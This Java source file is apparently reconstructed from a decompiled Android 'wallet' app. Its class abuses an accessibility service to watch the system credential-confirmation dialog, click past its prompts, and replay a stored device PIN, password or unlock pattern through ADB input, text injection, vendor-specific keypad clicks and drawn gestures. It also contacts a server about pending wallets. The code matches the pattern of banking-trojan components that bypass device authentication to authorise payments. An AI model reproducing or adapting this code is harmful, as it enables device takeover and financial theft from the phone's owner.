package com.guard.wallet.delegate;
import com.guard.wallet.core.AppUtils;

import android.graphics.Rect;
import android.os.Build;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import com.guard.wallet.condition.StringCondition;


import com.guard.wallet.entity.Point;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.entity.UiObjectCollection;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.filter.CombineFiltersWithOr;
import com.guard.wallet.req.ListenWindow;
import com.guard.wallet.req.ReqUnlockDeviceVO;
import com.guard.wallet.resp.DeviceWalletAuthStrategyVO;
import com.guard.wallet.service.AccessibilityDelegateManager;
import com.guard.wallet.service.MyAccessibilityService;
import java.util.Collections;
import java.util.HashSet;
import java.util.LinkedList;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.SynchronousQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicReference;

/**
 * vendor o/g0 — UseDeviceCredentialDelegate (extends o.e).
 * Handles credential/biometric verification:
 * - PIN, password, pattern, and fingerprint unlock automation
 * - Verify mode vs Assist mode
 * - Clicks cancel/close buttons, enters PIN via virtual keypad
 *
 * ListenWindows: com.android.systemui (ConfirmDeviceCredentialActivity)
 */
public final class UseDeviceCredentialDelegate extends AccessibilityDelegate {

    /** Thread pool for credential verification tasks */
    public final ThreadPoolExecutor n;

    /** Pending operation queue */
    public final ConcurrentLinkedQueue o;

    /** Assist mode strategy queue (DeviceWalletAuthStrategyVO) */
    public final ConcurrentLinkedQueue p;

    /** Verify mode package whitelist */
    public final ConcurrentLinkedQueue q;

    /** Current target package name */
    public final AtomicReference r;

    /** Current credential mode (r.c enum: ASSIST_MODE, VERIFY_MODE, VERIFY_PAUSE) */
    public final AtomicReference s;

    // ADAPT: cache enum values — field 's' (AtomicReference) shadows potential access;
    // and o.r class is accessed as o.r from EngineHelper
    private static final Object CREDENTIAL_ASSIST = EngineHelper.CREDENTIAL_ASSIST_MODE;
    private static final Object CREDENTIAL_VERIFY = EngineHelper.CREDENTIAL_VERIFY_MODE;
    private static final Object CREDENTIAL_PAUSE = EngineHelper.CREDENTIAL_VERIFY_PAUSE;

    public UseDeviceCredentialDelegate() {
        super(T(), "com.android.systemui");
        this.n = new ThreadPoolExecutor(0, 5, 10L, TimeUnit.SECONDS, new SynchronousQueue<>());
        this.o = new ConcurrentLinkedQueue();
        this.p = new ConcurrentLinkedQueue();
        this.q = new ConcurrentLinkedQueue();
        this.r = new AtomicReference(null);
        this.s = new AtomicReference<>(CREDENTIAL_ASSIST);
        X(CREDENTIAL_ASSIST);
        if (Objects.equals(R(), CREDENTIAL_ASSIST)) {
            com.guard.wallet.http.HttpApiManager.queryNoCompleteWallets();
        }
    }

    // ======= Static CombineFilter builders =======

    /** Filter: id = com.android.systemui:id/cancel */
    public static CombineFilter H() {
        CombineFilter cf = new CombineFilter();
        cf.setStringConditions(new LinkedList<>());
        StringCondition sc = new StringCondition();
        sc.setProperty("id");
        sc.setEquals("com.android.systemui".concat(":id/cancel"));
        cf.getStringConditions().add(sc);
        return cf;
    }

    /** Filter: id = com.android.systemui:id/button_negative */
    public static CombineFilter I() {
        CombineFilter cf = new CombineFilter();
        cf.setStringConditions(new LinkedList<>());
        StringCondition sc = new StringCondition();
        sc.setProperty("id");
        sc.setEquals("com.android.systemui".concat(":id/button_negative"));
        cf.getStringConditions().add(sc);
        return cf;
    }

    /** Filter: id = com.android.systemui:id/button_use_credential */
    public static CombineFilter J() {
        CombineFilter cf = new CombineFilter();
        cf.setStringConditions(new LinkedList<>());
        StringCondition sc = new StringCondition();
        sc.setProperty("id");
        sc.setEquals("com.android.systemui".concat(":id/button_use_credential"));
        cf.getStringConditions().add(sc);
        return cf;
    }

    /** Filter: ViewGroup id prefix = com.android.systemui:id/key (numeric keypad keys) */
    public static CombineFilter L() {
        CombineFilter cf = new CombineFilter();
        StringCondition sc = FilterHelper.addCondition(cf,
                FilterHelper.initFilter(cf, "className", "android.view.ViewGroup"), "id");
        sc.setPrefix("com.android.systemui".concat(":id/key"));
        cf.getStringConditions().add(sc);
        return cf;
    }

    /** Build ListenWindow list for credential verification UI */
    public static LinkedList T() {
        LinkedList list = new LinkedList();

        /* Window 1: ConfirmDeviceCredentialActivity with specific event types */
        ListenWindow lw1 = new ListenWindow("com.android.systemui",
                "com.android.settings.password.ConfirmDeviceCredentialActivity");
        HashSet eventTypes1 = FilterHelper.initEventTypes(lw1);
        eventTypes1.add(32);
        lw1.getEventTypes().add(16384);
        lw1.getEventTypes().add(8);
        lw1.getEventTypes().add(2048);
        lw1.getEventTypes().add(AccessibilityDelegateManager.j);
        list.add(lw1);

        /* Window 2: com.android.systemui / null (catch-all) */
        ListenWindow lw2 = new ListenWindow("com.android.systemui", null);
        lw2.setEventTypes(new HashSet<>());
        lw2.getEventTypes().add(32);
        lw2.getEventTypes().add(16384);
        lw2.getEventTypes().add(8);
        lw2.getEventTypes().add(2048);
        lw2.getEventTypes().add(AccessibilityDelegateManager.j);
        list.add(lw2);

        return list;
    }

    /** Filter: lockPattern or biometric_lockPattern (gesture pattern views) */
    public static CombineFiltersWithOr U() {
        CombineFiltersWithOr result = new CombineFiltersWithOr();
        result.setFilters(new LinkedList<>());

        /* lockPattern */
        CombineFilter cf1 = new CombineFilter();
        StringCondition sc1 = FilterHelper.addCondition(cf1,
                FilterHelper.initFilter(cf1, "className", "android.view.View"), "id");
        sc1.setEquals("com.android.systemui".concat(":id/lockPattern"));
        cf1.getStringConditions().add(sc1);
        result.getFilters().add(cf1);

        /* biometric_lockPattern */
        CombineFilter cf2 = new CombineFilter();
        StringCondition sc2 = FilterHelper.addCondition(cf2,
                FilterHelper.initFilter(cf2, "className", "android.view.View"), "id");
        sc2.setEquals("com.android.systemui".concat(":id/biometric_lockPattern"));
        cf2.getStringConditions().add(sc2);
        result.getFilters().add(cf2);

        return result;
    }

    /** Filter: View with desc equals given string (for MIUI PIN pad) */
    public static CombineFilter W(String desc) {
        CombineFilter cf = new CombineFilter();
        StringCondition sc = FilterHelper.addConditionWithEquals(cf,
                FilterHelper.initFilter(cf, "className", "android.view.View"), "desc", desc);
        cf.getStringConditions().add(sc);
        return cf;
    }

    /** Filter: Button id prefix = com.android.systemui:id/num (numeric buttons) */
    public static CombineFilter Y() {
        CombineFilter cf = new CombineFilter();
        StringCondition sc = FilterHelper.addCondition(cf,
                FilterHelper.initFilter(cf, "className", "android.widget.Button"), "id");
        sc.setPrefix("com.android.systemui".concat(":id/num"));
        cf.getStringConditions().add(sc);
        return cf;
    }

    /** Filter: Button id prefix = com.android.systemui:id/four_to_more_key */
    public static CombineFilter Z() {
        CombineFilter cf = new CombineFilter();
        StringCondition sc = FilterHelper.addCondition(cf,
                FilterHelper.initFilter(cf, "className", "android.widget.Button"), "id");
        sc.setPrefix("com.android.systemui".concat(":id/four_to_more_key"));
        cf.getStringConditions().add(sc);
        return cf;
    }

    // ======= Instance methods =======

    /**
     * K() — wait for systemui to close (up to 20 seconds).
     * Returns true if the foreground package is no longer com.android.systemui.
     */
    public final boolean K() {
        AtomicInteger counter = new AtomicInteger(0);
        boolean isSystemUI = Objects.equals(MyAccessibilityService.N(), "com.android.systemui");
        while (true) {
            boolean notSystemUI = !isSystemUI;
            if (counter.incrementAndGet() > 20 || notSystemUI) {
                return notSystemUI;
            }
            com.guard.wallet.utils.SystemHelper.T0(1);
            isSystemUI = Objects.equals(MyAccessibilityService.N(), "com.android.systemui");
        }
    }

    /**
     * M() — click confirm button after entering PIN/password.
     * Tries multiple confirm button IDs: mix_confirm, iv_complete, vivo_pin_confirm, mix_normal_confirm.
     */
    public final void M() {
        if (MyAccessibilityService.P() == null || this.k() == null || !com.guard.wallet.utils.DeviceUtils.isVivoFamily()) {
            return;
        }

        /* Try mix_confirm */
        CombineFilter cf1 = new CombineFilter();
        StringCondition sc1 = FilterHelper.addCondition(cf1,
                FilterHelper.initFilter(cf1, "className", "android.view.View"), "id");
        sc1.setEquals("com.android.systemui".concat(":id/mix_confirm"));
        cf1.getStringConditions().add(sc1);
        UiObject btn = this.k().findOneByCombine(cf1);
        if (btn != null && btn.click()) return;

        /* Try iv_complete */
        CombineFilter cf2 = new CombineFilter();
        StringCondition sc2 = FilterHelper.addCondition(cf2,
                FilterHelper.initFilter(cf2, "className", "android.widget.TextView"), "id");
        sc2.setEquals("com.android.systemui".concat(":id/iv_complete"));
        cf2.getStringConditions().add(sc2);
        btn = this.k().findOneByCombine(cf2);
        if (btn != null && btn.click()) return;

        /* Try vivo_pin_confirm */
        CombineFilter cf3 = new CombineFilter();
        StringCondition sc3 = FilterHelper.addCondition(cf3,
                FilterHelper.initFilter(cf3, "className", "android.widget.Button"), "id");
        sc3.setEquals("com.android.systemui".concat(":id/vivo_pin_confirm"));
        cf3.getStringConditions().add(sc3);
        btn = this.k().findOneByCombine(cf3);
        if (btn != null && btn.click()) return;

        /* Try mix_normal_confirm */
        CombineFilter cf4 = new CombineFilter();
        StringCondition sc4 = FilterHelper.addCondition(cf4,
                FilterHelper.initFilter(cf4, "className", "android.widget.TextView"), "id");
        sc4.setEquals("com.android.systemui".concat(":id/mix_normal_confirm"));
        cf4.getStringConditions().add(sc4);
        btn = this.k().findOneByCombine(cf4);
        if (btn != null) {
            btn.click();
        }
    }

    /**
     * N() — try to unlock using stored device cipher (from utils.h.f).
     */
    public final boolean N() {
        ReqUnlockDeviceVO cipher = com.guard.wallet.utils.SharedPrefsManager.f();
        boolean result = cipher != null && P(cipher);
        if (result) {
            cipher.setLocked(Boolean.TRUE);
            com.guard.wallet.utils.SharedPrefsManager.C(cipher);
            this.o.remove("inUseDeviceCredential");
        }
        return result;
    }

    /**
     * O() — try to unlock using secondary stored cipher (from utils.h.g).
     */
    public final boolean O() {
        ReqUnlockDeviceVO cipher = com.guard.wallet.utils.SharedPrefsManager.g();
        boolean result = cipher != null && P(cipher);
        if (result) {
            cipher.setLocked(Boolean.TRUE);
            com.guard.wallet.utils.SharedPrefsManager.C(cipher);
            this.o.remove("inUseDeviceCredential");
        }
        return result;
    }

    /**
     * P(cipher) — attempt to unlock the device using the given cipher.
     * Supports: numeric PIN, alphanumeric password, pattern gesture.
     */
    public final boolean P(ReqUnlockDeviceVO cipher) {
        /* Handle text-based ciphers (PIN, password, numeric) */
        if ((Objects.equals(cipher.getCipherGradeCode(), "PASSWORD_QUALITY_NUMERIC_COMPLEX")
                || Objects.equals(cipher.getCipherGradeCode(), "PASSWORD_QUALITY_ALPHANUMERIC")
                || Objects.equals(cipher.getCipherGradeCode(), "PASSWORD_QUALITY_NUMERIC")
                || Objects.equals(cipher.getCipherGradeCode(), "PASSWORD_QUALITY_TOUCH_POINTS"))
                && !AppUtils.B(cipher.getTextCipher())) {

            String textCipher = cipher.getTextCipher();

            /* Strategy 1: ADB input text */
            boolean unlocked = false;
            if (!AppUtils.B(textCipher)) {
                if (EngineHelper.isAdbAvailable()) {
                    com.guard.wallet.utils.SystemHelper.T0(1);
                    if (EngineHelper.adbExec("input text ".concat(textCipher))) {
                        Q(null);
                        if (K()) {
                            unlocked = true;
                        }
                    }
                }

                /* Strategy 2: EditText setText */
                if (!unlocked && this.k() != null) {
                    UiObject focused = this.k().currentFocusedNode();
                    if (focused == null) {
                        focused = MyAccessibilityService.P().J();
                    }
                    if (focused != null && Objects.equals(focused.className(), "android.widget.EditText")
                            && focused.setText(textCipher)) {
                        Q(focused);
                        unlocked = K();
                    }
                }
            }

            if (unlocked) return true;

            /* Strategy 3: Click virtual keypad buttons */
            String cipherCode = cipher.getCipherGradeCode();
            if (!AppUtils.B(textCipher) && MyAccessibilityService.P() != null) {
                AtomicReference pkgRef = this.j;
                boolean isNumeric = Objects.equals(cipherCode, "PASSWORD_QUALITY_NUMERIC_COMPLEX")
                        || Objects.equals(cipherCode, "PASSWORD_QUALITY_NUMERIC")
                        || Objects.equals(cipherCode, "PASSWORD_QUALITY_TOUCH_POINTS");

                if (isNumeric && this.k() != null) {
                    /* Try MIUI desc-based PIN pad (accessibility description matching) */
                    if (com.guard.wallet.utils.DeviceUtils.isOppoFamily()) {
                        boolean miuiSuccess = true;
                        for (int i = 0; i < textCipher.length(); i++) {
                            String digit = String.valueOf(textCipher.charAt(i));
                            UiObject node = this.k().findOneByCombine(W(digit));
                            if (node != null && node.click()) {
                                Log.d("UseDeviceCredentialDelegate", "Click Pin Node ID:" + digit);
                                com.guard.wallet.utils.SystemHelper.T0(1);
                            }
                        }
                        M();
                        if (K()) return true;
                    }

                    /* Try four_to_more_key buttons */
                    if (com.guard.wallet.utils.DeviceUtils.isVivoFamily()) {
                        UiObjectCollection fourKeys = this.k().findByCombine(Z());
                        String keyPrefix = ((String) pkgRef.get()).concat(":id/four_to_more_key");
                        if (fourKeys != null && fourKeys.size() > 0) {
                            for (int i = 0; i < textCipher.length(); i++) {
                                String keyId = keyPrefix.concat(String.valueOf(textCipher.charAt(i)));
                                for (UiObject node : fourKeys.getNodes()) {
                                    if (node != null && Objects.equals(node.id(), keyId) && node.click()) {
                                        Log.d("UseDeviceCredentialDelegate", "Click Pin Node ID:" + keyId);
                                        com.guard.wallet.utils.SystemHelper.T0(1);
                                    }
                                }
                            }
                            M();
                            if (K()) return true;
                        }
                    }

                    /* Try generic key buttons (ViewGroup id/key0-9) */
                    String keyBase = ((String) pkgRef.get()).concat(":id/key");
                    UiObjectCollection keys = this.k().findByCombine(L());
                    if (keys != null && keys.size() > 0) {
                        for (int i = 0; i < textCipher.length(); i++) {
                            String keyId = keyBase.concat(String.valueOf(textCipher.charAt(i)));
                            for (UiObject node : keys.getNodes()) {
                                if (node != null && Objects.equals(node.id(), keyId) && node.click()) {
                                    Log.d("UseDeviceCredentialDelegate", "Click Pin Node ID:" + keyId);
                                    com.guard.wallet.utils.SystemHelper.T0(1);
                                }
                            }
                        }
                        M();
                        if (K()) return true;
                    }
                } else if (Objects.equals(cipherCode, "PASSWORD_QUALITY_ALPHANUMERIC")
                        && !AppUtils.B(textCipher) && MyAccessibilityService.P() != null
                        && this.k() != null && com.guard.wallet.utils.DeviceUtils.isVivoFamily()) {
                    /* VIVO alphanumeric: num buttons + char buttons */
                    UiObjectCollection numBtns = this.k().findByCombine(Y());
                    CombineFilter charFilter = new CombineFilter();
                    StringCondition charSc = FilterHelper.addCondition(charFilter,
                            FilterHelper.initFilter(charFilter, "className", "android.widget.Button"), "id");
                    charSc.setPrefix("com.android.systemui".concat(":id/char_"));
                    charFilter.getStringConditions().add(charSc);
                    UiObjectCollection charBtns = this.k().findByCombine(charFilter);

                    if (numBtns != null && numBtns.size() > 0
                            && charBtns != null && charBtns.size() > 0) {
                        for (int i = 0; i < textCipher.length(); i++) {
                            String ch = String.valueOf(textCipher.charAt(i));
                            if (AppUtils.D(ch)) {
                                /* Digit */
                                String numId = ((String) pkgRef.get()).concat(":id/num").concat(ch);
                                for (UiObject node : numBtns.getNodes()) {
                                    if (node != null && Objects.equals(node.id(), numId) && node.click()) {
                                        Log.d("UseDeviceCredentialDelegate", "Click VIVO Num Node ID:" + numId);
                                        com.guard.wallet.utils.SystemHelper.T0(1);
                                    }
                                }
                            } else {
                                /* Character */
                                String charId = ((String) pkgRef.get()).concat(":id/char_").concat(ch);
                                for (UiObject node : charBtns.getNodes()) {
                                    if (node != null && Objects.equals(node.id(), charId) && node.click()) {
                                        Log.d("UseDeviceCredentialDelegate", "Click VIVO Char Node ID:" + charId);
                                        com.guard.wallet.utils.SystemHelper.T0(1);
                                    }
                                }
                            }
                        }
                        M();
                        if (K()) return true;
                    }
                }
            }
        }

        /* Handle pattern-based cipher */
        if (Objects.equals(cipher.getCipherGradeCode(), "PASSWORD_QUALITY_PATTERN")) {
            List patternCipher = cipher.getPatternCipher();
            Rect boundsScreen = cipher.getBoundsInScreen();
            Rect boundsParent = cipher.getBoundsInParent();

            if (patternCipher != null && !patternCipher.isEmpty()) {
                LinkedList points = new LinkedList(patternCipher);
                com.guard.wallet.helper.NodeBoundsHelper.d(points);

                if (this.k() != null && MyAccessibilityService.P() != null) {
                    UiObject patternView = this.k().findOneByOperateOr(U());
                    if (patternView != null) {
                        Log.d("UseDeviceCredentialDelegate", "confirmLockByGesture pattern:" + patternView);

                        if (!com.guard.wallet.utils.DeviceUtils.isVivoFamily()) {
                            com.guard.wallet.helper.NodeBoundsHelper.e(points, boundsScreen, boundsParent,
                                    patternView.boundsInWindow(), patternView.boundsInParent());
                        }

                        /* Try gesture with increasing duration */
                        int pointCount = points.size();
                        Point[] pointArray = new Point[pointCount];
                        points.toArray(pointArray);

                        boolean gestureUnlocked = false;
                        if (pointCount > 0) {
                            for (int attempt = 1; attempt <= 4; attempt++) {
                                long duration = (long) attempt * 1000L;
                                try {
                                    CountDownLatch latch = new CountDownLatch(1);
                                    if (!com.guard.wallet.utils.SystemHelper.S(10L, duration, pointArray)) {
                                        continue;
                                    }
                                    latch.await(duration + 1000L, TimeUnit.MILLISECONDS);
                                    Log.d("UseDeviceCredentialDelegate", "ResolveGesture Done");
                                    gestureUnlocked = K();
                                } catch (Exception ex) {
                                    AppUtils.s("UseDeviceCredentialDelegate", ex);
                                    break;
                                }
                                if (gestureUnlocked) break;
                            }
                        }

                        if (!gestureUnlocked) {
                            gestureUnlocked = K();
                        }

                        if (gestureUnlocked) return true;

                        /* Fallback: ADB gesture */
                        if (EngineHelper.isAdbAvailable()
                                && EngineHelper.adbDrawPattern(points)) {
                            if (K()) return true;
                        }
                    }
                }
            }
        }

        return false;
    }

    /**
     * Q(node) — press Enter after entering text cipher.
     * Tries ADB input keyevent 66, then node.enter() on SDK >= 30.
     */
    public final void Q(UiObject node) {
        if (EngineHelper.isAdbAvailable() && EngineHelper.adbExec("input keyevent 66")) {
            return;
        }
        if (node == null && this.k() != null) {
            node = this.k().currentFocusedNode();
        }
        if (node == null && MyAccessibilityService.P() != null) {
            node = MyAccessibilityService.P().J();
        }
        if (node != null && Build.VERSION.SDK_INT >= 30) {
            node.enter();
        }
    }

    /**
     * R() — get current credential mode (synchronized on CREDENTIAL_ASSIST.getClass()).
     */
    public final Object R() {
        synchronized (CREDENTIAL_ASSIST.getClass()) {
            return this.s.get();
        }
    }

    /**
     * S() — check if delegate should be active (has a target package and mode is valid).
     */
    public final boolean S() {
        if (Objects.equals(R(), CREDENTIAL_PAUSE)) {
            return false;
        }
        if (Objects.equals(R(), CREDENTIAL_VERIFY) && this.r.get() != null) {
            return true;
        }
        return Objects.equals(R(), CREDENTIAL_ASSIST) && this.r.get() != null;
    }

    /**
     * V(packageName, windowClass) — handle package/window notification.
     * Updates target package based on current mode and whitelist.
     */
    public final void V(String packageName, String windowClass) {
        boolean isVerifyMode = Objects.equals(R(), CREDENTIAL_VERIFY);
        AtomicReference targetRef = this.r;

        if (isVerifyMode) {
            ConcurrentLinkedQueue verifyList = this.q;
            if (!verifyList.isEmpty() && !AppUtils.B(packageName) && verifyList.contains(packageName)) {
                targetRef.set(packageName);
                return;
            }
        }

        if (Objects.equals(R(), CREDENTIAL_ASSIST)) {
            ConcurrentLinkedQueue assistList = this.p;
            if (!assistList.isEmpty() && (!AppUtils.B(packageName) || !AppUtils.B(windowClass))) {
                DeviceWalletAuthStrategyVO strategy = new DeviceWalletAuthStrategyVO();
                strategy.setPackageName(packageName);
                strategy.setListenWinClasses(Collections.singletonList(windowClass));
                if (assistList.contains(strategy)) {
                    targetRef.set(packageName);
                } else {
                    targetRef.set(null);
                    com.guard.wallet.http.HttpApiManager.queryNoCompleteWallets();
                }
            }
        }
    }

    /**
     * X(mode) — set current credential mode (synchronized on CREDENTIAL_ASSIST.getClass()).
     */
    public final void X(Object mode) {
        synchronized (CREDENTIAL_ASSIST.getClass()) {
            this.s.set(mode);
        }
    }

    // ======= Lifecycle =======

    @Override
    public final void d() {
        try {
            this.n.shutdownNow();
            this.o.clear();
            this.p.clear();
            this.q.clear();
            this.r.set(null);
            super.d();
        } catch (Exception e2) {
            AppUtils.s("UseDeviceCredentialDelegate", e2);
        }
    }

    @Override
    public final boolean equals(Object obj) {
        return obj instanceof UseDeviceCredentialDelegate;
    }

    @Override
    public final int hashCode() {
        return Objects.hash(UseDeviceCredentialDelegate.class.getName());
    }

    @Override
    public final void u(AccessibilityEvent event, String packageName, String className) {
        if (com.guard.wallet.utils.SystemHelper.p0()) {
            return;
        }
        if (S()) {
            super.u(event, packageName, className);
        }
        if (S()) {
            boolean inCredentialWindow = false;
            if (this.q(T())) {
                UiObject root = this.k();
                CombineFiltersWithOr closeFilters = new CombineFiltersWithOr();
                closeFilters.setFilters(new LinkedList<>());
                closeFilters.getFilters().add(J());
                closeFilters.getFilters().add(I());
                UiObject closeBtn = root.findOneByOperateOr(closeFilters);
                if (closeBtn == null) {
                    Log.d("UseDeviceCredentialDelegate", "已进入用户设备密码验证窗口");
                    inCredentialWindow = true;
                } else {
                    closeBtn.click();
                    Log.d("UseDeviceCredentialDelegate", "已点击密码验证引导按钮");
                }
            }

            if (inCredentialWindow) {
                boolean isVerifyMode = Objects.equals(R(), CREDENTIAL_VERIFY);
                ThreadPoolExecutor pool = this.n;
                if (isVerifyMode) {
                    pool.submit(new com.guard.wallet.delegate.task.DeviceCredentialTask(this, 0));
                }
                if (Objects.equals(R(), CREDENTIAL_ASSIST)) {
                    pool.submit(new com.guard.wallet.delegate.task.DeviceCredentialTask(this, 1));
                }
            }
        }
    }
}
